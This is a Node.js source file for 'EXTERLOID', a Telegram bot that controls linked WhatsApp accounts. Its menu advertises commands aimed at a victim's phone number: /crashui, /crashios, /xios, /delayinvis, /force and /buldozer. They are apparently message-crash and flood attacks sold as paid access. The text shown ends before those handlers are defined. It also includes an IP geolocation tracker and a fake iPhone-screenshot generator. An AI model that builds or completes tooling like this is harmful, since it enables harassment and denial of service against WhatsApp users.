const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReConnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisConnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const dotenv = require("dotenv");
const FormData = require("form-data");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "./assets/cooldown.json";
const axios = require("axios");
const chalk = require("chalk");
const moment = require('moment');
const config = require("./settings/config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// ~ Thumbnail Vid
const vidthumbnail = "https://files.catbox.moe/dxjr0p.mp4";

// ~ Database Url
const databaseURL = "https://raw.githubusercontent.com/Rejaxit/dbexterloid/refs/heads/main/token.json";

async function isTokenRegistered(token) {
    try {
        const response = await axios.get(databaseURL);
        const tokenData = response.data;

        if (!tokenData.tokens.includes(token)) {
            console.log(chalk.red("EXTERLOID [ ⚚ ]\n❌ Your Bot Token Is Not Registered\n— Please Contact The Owner\n— @ejaaskuy ( Telegram )"));
            process.exit(1); // Keluar dari script
        } else {
            console.log(chalk.cyan("EXTERLOID [ ⚚ ]\n– Version : 5.0\n– Creator : @ejaaskuy\n– Telegram : @ejaaskuy\n\nTelegram Bot Successfully Connected"));
        }
    } catch (error) {
        console.error("❌ Gagal mengambil data token:", error.message);
        process.exit(1);
    }
}


isTokenRegistered(BOT_TOKEN);

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./database/premium.json');
ensureFileExists('./database/admin.json');

let premiumUsers = JSON.parse(fs.readFileSync('./database/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./database/admin.json'));

function savePremiumUsers() {
    fs.writeFileSync('./database/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./database/admin.json', JSON.stringify(adminUsers, null, 2));
}

function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./database/premium.json', (data) => (premiumUsers = data));
watchFile('./database/admin.json', (data) => (adminUsers = data));

const USER_IDS_FILE = 'database/userids.json';

function readUserIds() {
    try {
        const data = fs.readFileSync(USER_IDS_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Gagal membaca daftar ID pengguna:', error);
        return [];
    }
}


function saveUserIds(userIds) {
    try {
        fs.writeFileSync(USER_IDS_FILE, JSON.stringify(Array.from(userIds)), 'utf8');
    } catch (error) {
        console.error('Gagal menyimpan daftar ID pengguna:', error);
    }
}

const userIds = new Set(readUserIds());

function addUser(userId) {
    if (!userIds.has(userId)) {
        userIds.add(userId);
        saveUserIds(userIds);
        console.log(`Pengguna ${userId} ditambahkan.`);
    }
}

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("Connection.update", async (update) => {
            const { Connection, lastDisConnect } = update;
            if (Connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (Connection === "close") {
              const shouldReConnect =
                lastDisConnect?.error?.output?.statusCode !==
                DisConnectReason.loggedOut;
              if (shouldReConnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp Connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function ConnectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
<blockquote>EXTERLOID [ ⚚ ]</blockquote>
╭──────────────
│Number : ${botNumber}.
│Status : Proses
╰──────────────
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
<blockquote>EXTERLOID [ ⚚ ]</blockquote>
╭──────────────
│ Number : ${botNumber}.
│ Status : proses ⏳
╰──────────────
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await ConnectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote>EXTERLOID [ ⚚ ]</blockquote>
╭──────────────
│Number : ${botNumber}.
│Status : Gagal ❌
╰──────────────
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
<blockquote>EXTERLOID [ ⚚ ]</blockquote>
╭─────────────────
│Number : ${botNumber}.
│Status : Berhasil Terhubung
╰─────────────────
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  let customcode = "XREJAXXX"
  const code = await sock.requestPairingCode(botNumber, customcode);
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
<blockquote>EXTERLOID [ ⚚ ]</blockquote>
╭──────────────
│ Number : ${botNumber}.
│ Code Pairing : ${formattedCode}
╰──────────────
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "HTML",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote>EXTERLOID [ ⚚ ]</blockquote>
╭──────────────
│ Number : ${botNumber}.
│Status : Error ❌ ${error.message}
╰──────────────
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

// ~ Fungsional Function Before Parameters
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~ Get Speed Bots
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}

// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setcd 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Premium ! - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}
 
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};
let tokenValidated = false;
let secureMode = false;
bot.on("message", async (msg) => {
  if (secureMode) return;

  const chatId = msg.chat.id;
  const text = msg.text ? msg.text.trim() : "";

  if (!tokenValidated && !text.startsWith("/start")) {
    return bot.sendMessage(
      chatId,
      "Akses terkunci.\nKetik: /start <token> untuk mengaktifkan bot. 🔒"
    );
  }
});
/*=====================================================================================
  🕊️ Credits By Ramz 
  note: mininal rename ada nama gua
=====================================================================================*/
bot.onText(/^\/start(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userToken = match[1] ? match[1].trim() : "";

  if (!tokenValidated) {
    if (!userToken) {
      return bot.sendMessage(
        chatId,
        "🔑 Masukkan token anda untuk mengaktifkan bot.\nFormat:\n`/start <token>`",
        { parse_mode: "Markdown" }
      );
    }

    try {
      const res = await axios.get(databaseURL);
      const tokens = (res.data && res.data.tokens) || [];

      // Validasi token
      if (!tokens.includes(userToken) || userToken !== BOT_TOKEN) {
        return bot.sendMessage(chatId, "❌ Token tidak terdaftar, masukkan yang valid");
      }

      tokenValidated = true;
      return bot.sendMessage(chatId, "✅ Token berhasil diaktifkan!\nKetik /menu untuk membuka menu utama.");
    } catch (err) {
      console.error(err);
      return bot.sendMessage(chatId, "❌ Gagal memverifikasi token");
    }
  } else {
    bot.sendMessage(chatId, "✅ Bot sudah aktif.\nGunakan perintah /menu untuk melanjutkan.");
  }
});

bot.onText(/\/menu/, (msg) => {
  if (!tokenValidated) {
    return bot.sendMessage(msg.chat.id, "Akses terkunci. Ketik /start <token> untuk aktivasi. 🔒");
  }
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();

  bot.sendVideo(chatId, vidthumbnail, {
caption: `
<blockquote><b>[ ⾷ ]ＥＲＲＯＲＴＭＥＮＴ </b></blockquote>
─ Ollaa, i'm script telegram created by @ejaaskuy use this script wisely.

( 𓆩✧𓆪 )「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 」
<b>ᯓ➤. BotName : EXTERLOID</b>
<b>ᯓ➤. Creator : @ejaaskuy</b>
<b>ᯓ➤. Version : 1.0</b>
<b>ᯓ➤. Runtime : ${runtime}</b>

<blockquote><b>EXTERLOID - @ejaaskuy 🕊️</b></blockquote>
`,

    parse_mode: "HTML",
    reply_markup: {
     inline_keyboard: [
     [
      { text: "メニューのバグ👾", callback_data: "trashmenu" },
      { text: "オーナーメニュー👻", callback_data: "accesmenu" }
    ],
    [
      { text: "ツールメニュー🐸", callback_data: "toolsmenu" }
    ],
    [ 
      { text: "おかげで🌞", callback_data: "thanksto" }
    ],
    [
      { text: "スクリプトオーナー💀", url: "https://t.me/@ejaaskuy" }
    ]
  ]
 }
 });
});


bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);

    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashmenu") {
      caption = `
<blockquote><b>[ ⾷ ] ＥＲＲＯＲＴＭＥＮＴ</b></blockquote>

( 𓆩✧𓆪 )「 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 」

☐. delayinvis
╰➤ Example: /delayinvis 628xx
☐. delayduration
╰➤ Example: /delayduration 628xxx
☐. sisterblank
╰➤ Example: /sisterblank 628xxx
☐. crashui
╰➤ Example: /crashui 628xx
☐. crashios
╰➤ Example: /crashios 628xx
☐. xios
╰➤ Example: /xios 628xxx
☐. buldozer
╰➤ Example: /buldozer 62xxx
☐. force
╰➤ Example: /force 628xx
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "accesmenu") {
      caption = `
<blockquote><b>[ ⾷ ] ＥＲＲＯＲＴＭＥＮＴ</b></blockquote>

( 𓆩✧𓆪 )「 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 」

☐. setcd
╰➤ Example: /setcd 5m
☐. addadmin
╰➤ Example: /addadmin [id]
☐. addprem
╰➤ Example: /addprem [id]
☐. deladmin
╰➤ Example: /deladmin [id]
☐. delprem
╰➤ Example: /delprem [id]
☐. connect
╰➤ Example: /connect [628xxx]
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "back_to_main" }]] };
    }

    if (query.data === "toolsmenu") {
      caption = `
<blockquote><b>[ ⾷ ] ＥＲＲＯＲＴＭＥＮＴ</b></blockquote>

( 𓆩✧𓆪 )「 𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔 」

☐. cekid
╰➤ Example: /cekid
☐. csessions
╰➤ Example: /csessions domain,plta,pltc
☐. addsender
╰➤ Example: /addsender "creds":
☐. ssip
╰➤ Example: /ssip 18:00|40|Indosat|Ramz
☐. tiktok
╰➤ Example: /tiktok link vt
☐. trackip
╰➤ Example: /trackip 8.8.8.8
☐. tourl
╰➤ Example: /tourl reply foto/video
☐. brat
╰➤ Example: /brat teks
☐. cekganteng
╰➤ Example: /cekganteng nama
☐. cekcantik
╰➤ Example: /cekcantik nama
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "thanksto") {
      caption = `
<blockquote><b>[ ⾷ ] ＥＲＲＯＲＴＭＥＮＴ</b></blockquote>

「 🌷 」 𝐓𝐇𝐀𝐍𝐊𝐒 𝐒𝐔𝐏𝐏𝐎𝐑𝐓

☐. 𝗲𝗷𝗮 𝗼𝗳𝗳𝗶𝗰𝗶𝗮𝗹
╰➤ Creator Script
☐. ALL TITLE EXTERLOID.
☐. ALL PENGGUNA SCRIPT.
`;
      replyMarkup = { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "back_to_main" }]] };
    }

    if (query.data === "back_to_main") {
      caption = `
<blockquote><b>[ ⾷ ] ＥＲＲＯＲＴＭＥＮＴ</b></blockquote>
─ Ollaa, i'm script telegram created by @ejaaskuy use this script wisely.

( 𓆩✧𓆪 )「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 」
<b>ᯓ➤. BotName : EXTERLOID</b>
<b>ᯓ➤. Creator : @ejaaskuy</b>
<b>ᯓ➤. Version : 1.0</b>
<b>ᯓ➤. Runtime : ${runtime}</b>

<b>EXTERLOID - @ejaaskuy  🕊️</b>
`;
      replyMarkup = {
     inline_keyboard: [
     [
      { text: "メニューのバグ👾", callback_data: "trashmenu" },  
      { text: "オーナーメニュー👻", callback_data: "accesmenu" }
    ],
    [
      { text: "ツールメニュー🐸", callback_data: "toolsmenu" }
    ],
    [ 
      { text: "おかげで🌞", callback_data: "thanksto" }
    ],
    [
      { text: "スクリプトオーナー💀", url: "https://t.me/@ejaaskuy" }
    ]
  ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "video",
        media: vidthumbnail,
        caption: caption,
        parse_mode: "HTML"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
// ~ Connect
bot.onText(/\/connect (.+)/, async (msg, match) => {
const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Khusus Admin</blockquote>
Buy Acces Admin Ke スクリプトオーナー💀`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Owner", url: "https://t.me/@ejaaskuy" }]
        ]
      }
    });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Missing input. Please provide the number. Example: /Connect 62xxxx.");
  }
  
  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (!botNumber || botNumber.length < 10) {
    return bot.sendMessage(chatId, "❌ Nomor yang diberikan tidak valid. Pastikan nomor yang dimasukkan benar.");
  }

  try {
    await ConnectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in Connect:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
// ~ Tools And Fun Menu
bot.onText(/\/trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1];

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buy Acces? Pv Ke スクリプトオーナー💀`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Owner", url: "https://t.me/@ejaaskuy" }]
        ]
      }
    });
  }
  
  try {
    const res = await axios.get(`https://trackipapi.co/${ip}/json/`);
    const data = res.data;

    if (data.error) {
      return bot.sendMessage(chatId, "⚠️ IP tidak valid atau tidak ditemukan.");
    }

    const info = `
<blockquote>Tracking Ip Adress</blockquote>
( 🕸️ ) IP: ${data.ip}
( 🕸️ ) Negara: ${data.country_name}
( 🕸️ ) Wilayah: ${data.region}
( 🕸️ ) Kota: ${data.city}
( 🕸️ ) ISP: ${data.org}
( 🕸️ ) Latitude: ${data.latitude}
( 🕸️ ) Longitude: ${data.longitude}

<b>© EXTERLOID - @ejaaskuy<b>
    `;

    bot.sendMessage(chatId, info, { parse_mode: "HTML" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data IP.");
  }
});
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
// Command tanpa argumen
bot.onText(/\/trackip$/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, "❌ Contoh penggunaan:\n/trackip 8.8.8.8");
});
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
// Brat
bot.onText(/^\/brat(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) return bot.sendMessage(chatId, "❌ Masukkan teks!");

  try {
    const apiURL = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(
      text
    )}&isVideo=false`;
    const res = await axios.get(apiURL, { responseType: "arraybuffer" });

    await bot.sendSticker(chatId, res.data, { filename: "sticker.webp" });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    bot.sendMessage(chatId, "❌ Gagal membuat stiker brat.");
  }
});
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
// Tiktok
bot.onText(/^\/tiktok(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id
  const urlInput = match[1]?.trim()

  if (!urlInput) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid Input\nExample : /tiktok https://tiktok",
      { parse_mode: "HTML" }
    )
  }

  try {
    const res = await fetch(`https://apizsa.vercel.app/download/tiktok?url=${encodeURIComponent(urlInput)}`)
    const data = await res.json()

    if (!data.status || !data.result || !data.result.download_links || !data.result.download_links.hd_quality) {
      return bot.sendMessage(
        chatId,
        "❌ Gagal Saat Mengambil Video\nPastikan Url Valid!",
        { parse_mode: "HTML" }
      )
    }

    await bot.sendVideo(chatId, data.result.download_links.hd_quality)
  } catch {
    bot.sendMessage(
      chatId,
      "❌ Gagal Saat Mengambil Video", err,
      { parse_mode: "HTML" }
    )
  }
})
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
// Ss Iphone
bot.onText(/^\/ssip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(
      chatId,
      "❌ Missing Input\nExample : `/ssip 18:00|40|Indosat|ramz`",
      { parse_mode: "HTML" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "Example: `/ssip 18:00|40|Indosat|ramz`",
      { parse_mode: "HTML" }
    );
  }

  bot.sendMessage(chatId, "⏳ Wait A Moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ Ssip By @ejaaskuy ( 🕊️ )`,
      parse_mode: "HTML",
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
  }
});
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
bot.onText(/\/tourl/i, async (msg) => {
  const chatId = msg.chat.id;
  const repliedMsg = msg.reply_to_message;

  if (!repliedMsg || (!repliedMsg.document && !repliedMsg.photo && !repliedMsg.video)) {
    return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
  }

  let fileId, fileName;

  if (repliedMsg.document) {
    fileId = repliedMsg.document.file_id;
    fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
  } else if (repliedMsg.photo) {
    const photos = repliedMsg.photo;
    fileId = photos[photos.length - 1].file_id; // ambil resolusi tertinggi
    fileName = `photo_${Date.now()}.jpg`;
  } else if (repliedMsg.video) {
    fileId = repliedMsg.video.file_id;
    fileName = `video_${Date.now()}.mp4`;
  }

  try {
    const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox..."); 

    const file = await bot.getFile(fileId);
    const fileLink = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: fileName,
      contentType: response.headers["content-type"] || "application/octet-stream",
    });

    const { data: catboxUrl } = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    if (!catboxUrl.startsWith("https://")) {
      throw new Error("Catbox tidak mengembalikan URL yang valid");
    }

    await bot.editMessageText(`✅ Tourl By @ejaaskuy ( 🕊️ )\n📎 URL: ${catboxUrl}`, {
      chat_id: chatId,
      message_id: processingMsg.message_id,
    });

  } catch (error) {
    console.error("Upload error:", error?.response?.data || error.message);
    bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
  }
});
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
// Getcode
/*
bot.onText(/\/getcode (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const randomImage = getRandomImage();
   const userId = msg.from.id;
  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buy Acces?? Pv Ke スクリプトオーナー💀`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Owner", url: "https://t.me/@ejaaskuy" }]
        ]
      }
    });
  }
  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "❌ Missing Input\nExample: /getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ Get Code By @ejaaskuy ( 🕊️ ) ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "Error" + err);
  }
});
*/
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/
bot.onText(/^\/cekganteng(?: (.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(chatId, 'Nama nya mana yang mau di cek kegantengan nya 😎');
  }

  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  const hasil = `
╭━━━━°「 *Cek Ganteng ${text}* 」°
┃
┊• Nama : ${text}
┊• Tingkat Kegantengan : ${pickRandom([
    '100% Ganteng Parah 😎',
    '90% Ganteng Natural 😁',
    '75% Lumayan Ganteng 😌',
    '50% Standar Pasar Minggu 😅',
    '25% Masih Proses Pubertas 😂',
    '0% Gagal Upgrade 😭'
  ])}
┃• Aura : ${pickRandom([
    'Bersinar Terang ✨',
    'Biasa Aja 😶',
    'Kayak Lampu Redup 💡',
    'Misterius 😏',
    'Menyilaukan 🔥'
  ])}
┊• Nilai Tambah : ${pickRandom([
    'Punya senyum manis 😁',
    'Tatapan mematikan 😎',
    'Berwibawa banget 🧠',
    'Lucu dan menggemaskan 🐣',
    'Mirip artis katanya 🎬'
  ])}
╰═┅═━––––––๑`;

  bot.sendMessage(chatId, hasil);
});
/*=====================================================================================
  🕊️ Credits By ramz - wa.me/6283850340631 - telegram @ramzaOffc
=====================================================================================*/

bot.onText(/^\/cekcantik(?: (.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
